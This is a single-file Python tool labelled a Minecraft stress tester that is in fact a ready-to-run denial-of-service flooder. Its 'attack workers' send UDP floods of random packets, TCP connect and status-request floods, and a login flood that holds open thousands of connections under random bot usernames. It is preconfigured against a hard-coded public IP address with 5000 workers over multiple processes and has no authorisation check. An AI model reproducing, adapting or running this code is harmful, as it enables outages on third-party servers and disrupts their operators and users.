"""
Minecraft Stress Test Tool - Single File
"""
import asyncio, socket, time, multiprocessing, sys, struct, hashlib, ipaddress, string, random
from colorama import init, Fore

init(autoreset=True)

# ─── CONFIG ───────────────────────────────────────────────────────────────────
TARGET_IP = "5.133.100.33"
TARGET_PORT = 25600
PROTOCOL = "tcp"
METHOD = "login"
THREADS = 5000
DURATION = 300
PACKET_SIZE = 1024
RATE_DELAY = 0
PROCESSES = 0  # 0 = auto (CPU count)

# ─── UTILS ─────────────────────────────────────────────────────────────────────
COLORS = {"red": Fore.RED, "green": Fore.GREEN, "yellow": Fore.YELLOW, "blue": Fore.LIGHTBLUE_EX}

def cprint(msg, color=Fore.WHITE):
    print(f"{color}{msg}{Fore.RESET}")

def banner():
    cprint("Minecraft Stress Test Tool", Fore.YELLOW)

rand_username = lambda: "Bot_" + "".join(random.choices(string.ascii_letters + string.digits, k=6))
rand_bytes = lambda s: random.randbytes(s)

# ─── PROTOCOL ──────────────────────────────────────────────────────────────────
_VARINT_CACHE = {}

def _varint(val):
    if val in _VARINT_CACHE:
        return _VARINT_CACHE[val]
    out = b''
    while True:
        b = val & 0x7F
        val >>= 7
        if val:
            out += bytes([b | 0x80])
        else:
            out += bytes([b])
            break
    _VARINT_CACHE[val if val != 0 else 0] = out
    return out

def _pstr(s):
    e = s.encode('utf-8')
    return _varint(len(e)) + e

_HANDSHAKE_CACHE = {}
_STATUS_REQ_CACHE = None
_PROTO_VER = 767

def handshake_pkt(ip, port, nstate):
    k = (ip, port, nstate)
    if k in _HANDSHAKE_CACHE:
        return _HANDSHAKE_CACHE[k]
    h = _varint(0x00) + _varint(_PROTO_VER) + _pstr(ip) + struct.pack('>H', port) + _varint(nstate)
    p = _varint(len(h)) + h
    _HANDSHAKE_CACHE[k] = p
    return p

def status_req_pkt():
    global _STATUS_REQ_CACHE
    if _STATUS_REQ_CACHE:
        return _STATUS_REQ_CACHE
    r = _varint(0x00)
    p = _varint(len(r)) + r
    _STATUS_REQ_CACHE = p
    return p

def login_start_pkt(user):
    d = "OfflinePlayer:" + user
    dig = bytearray(hashlib.md5(d.encode('utf-8')).digest())
    dig[6] = dig[6] & 0x0f | 0x30
    dig[8] = dig[8] & 0x3f | 0x80
    ls = _varint(0x00) + _pstr(user) + bytes(dig)
    return _varint(len(ls)) + ls

async def do_handshake(sock, ip, port, nstate):
    try:
        await asyncio.get_running_loop().sock_sendall(sock, handshake_pkt(ip, port, nstate))
        return True
    except Exception:
        return False

async def do_status_req(sock):
    try:
        await asyncio.get_running_loop().sock_sendall(sock, status_req_pkt())
        return True
    except Exception:
        return False

async def do_login(sock, user):
    try:
        await asyncio.get_running_loop().sock_sendall(sock, login_start_pkt(user))
        return True
    except Exception:
        return False

# ─── ATTACK WORKERS ────────────────────────────────────────────────────────────
def make_udp_sock(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.connect((ip, port))
    s.setblocking(False)
    return s

async def udp_worker(ip, port, dur, psize, ptype, delay):
    end = time.time() + dur
    sock = make_udp_sock(ip, port)
    loop = asyncio.get_running_loop()
    prefix = {0: b"", 1: bytes([0x00, 0x00]), 2: bytes([0xFE, 0x01])}.get({"spam": 0, "handshake": 1, "query": 2}.get(ptype, 0), b"")
    ss = max(0, psize - len(prefix))
    payload = prefix + rand_bytes(ss) if ss > 0 else prefix
    while time.time() < end:
        try:
            await loop.sock_sendall(sock, payload)
        except Exception:
            try:
                sock.close()
                sock = make_udp_sock(ip, port)
            except Exception:
                break
        if delay > 0:
            await asyncio.sleep(delay)
    sock.close()

async def tcp_connect_worker(ip, port, dur, delay):
    loop = asyncio.get_running_loop()
    end = time.time() + dur
    while time.time() < end:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
            s.setblocking(False)
            try:
                await asyncio.wait_for(loop.sock_connect(s, (ip, port)), timeout=0.5)
            except Exception:
                pass
            finally:
                s.close()
        except Exception:
            pass
        if delay > 0:
            await asyncio.sleep(delay)

async def tcp_join_worker(ip, port, dur, delay):
    loop = asyncio.get_running_loop()
    end = time.time() + dur
    while time.time() < end:
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.setblocking(False)
            await asyncio.wait_for(loop.sock_connect(s, (ip, port)), timeout=1.0)
            if await do_handshake(s, ip, port, 1):
                await do_status_req(s)
                try:
                    await asyncio.wait_for(loop.sock_recv(s, 4096), timeout=0.5)
                except Exception:
                    pass
        except Exception:
            pass
        finally:
            if s:
                s.close()
        if delay > 0:
            await asyncio.sleep(delay)

async def tcp_login_worker(ip, port, dur, delay):
    loop = asyncio.get_running_loop()
    end = time.time() + dur
    held = []
    while time.time() < end:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.setblocking(False)
            await asyncio.wait_for(loop.sock_connect(s, (ip, port)), timeout=1.0)
            user = rand_username()
            if await do_handshake(s, ip, port, 2) and await do_login(s, user):
                held.append(s)
                continue
            s.close()
        except Exception:
            pass
        if delay > 0:
            await asyncio.sleep(delay)
    for s in held:
        try:
            s.close()
        except Exception:
            pass

# ─── PROCESS RUNNER ────────────────────────────────────────────────────────────
def run_process(protocol, method, ip, port, dur, threads, psize, delay):
    asyncio.run(_run_tasks(protocol, method, ip, port, dur, threads, psize, delay))

async def _run_tasks(protocol, method, ip, port, dur, threads, psize, delay):
    d = 0 if delay is None or delay <= 0 else delay
    ws = []
    if protocol == "udp":
        ws = [asyncio.create_task(udp_worker(ip, port, dur, psize, method, d)) for _ in range(threads)]
    else:
        fn = {"connect": tcp_connect_worker, "join": tcp_join_worker, "login": tcp_login_worker}.get(method, tcp_connect_worker)
        ws = [asyncio.create_task(fn(ip, port, dur, d)) for _ in range(threads)]
    await asyncio.gather(*ws, return_exceptions=True)

# ─── MAIN ──────────────────────────────────────────────────────────────────────
def main():
    banner()

    if len(sys.argv) == 5:
        ip, port, dur, thr = sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), int(sys.argv[4])
    elif len(sys.argv) == 2 and sys.argv[1] == "--menu":
        ip = input("IP: ").strip()
        port = int(input("Port: ").strip() or "25565")
        dur = int(input("Duration (s): ").strip() or "60")
        thr = int(input("Threads: ").strip() or "1000")
    else:
        ip, port, dur, thr = TARGET_IP, TARGET_PORT, DURATION, THREADS

    protocol, method = PROTOCOL, METHOD
    psize, delay = PACKET_SIZE, RATE_DELAY
    procs = PROCESSES

    cpu = multiprocessing.cpu_count()
    np = procs if procs > 0 else min(cpu, thr, 16)
    tpp = max(1, thr // np)
    ap = thr if protocol == "udp" else min(np, 16)

    cprint(f"[🚀] {protocol.upper()} {method} -> {ip}:{port}", Fore.CYAN)
    cprint(f"[📊] Duration: {dur}s | Threads: {thr} | Processes: {ap} | CPU: {cpu}", Fore.CYAN)

    workers = []
    for _ in range(ap):
        p = multiprocessing.Process(target=run_process, args=(protocol, method, ip, port, dur, tpp, psize, delay), daemon=True)
        p.start()
        workers.append(p)

    start = time.time()
    try:
        while time.time() - start < dur + 2:
            alive = sum(1 for p in workers if p.is_alive())
            sys.stdout.write(f"\r[📊] Elapsed: {time.time()-start:.1f}s | Alive: {alive}/{ap}")
            sys.stdout.flush()
            if alive == 0:
                break
            time.sleep(0.5)
    except KeyboardInterrupt:
        cprint("\n[!] Stopped", Fore.YELLOW)
    finally:
        for p in workers:
            if p.is_alive():
                p.terminate()
        for p in workers:
            p.join(timeout=1)
    cprint("\n[✅] Done", Fore.GREEN)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        cprint("\n[!] Stopped", Fore.YELLOW)
    except Exception as e:
        cprint(f"[❌] {e}", Fore.RED)
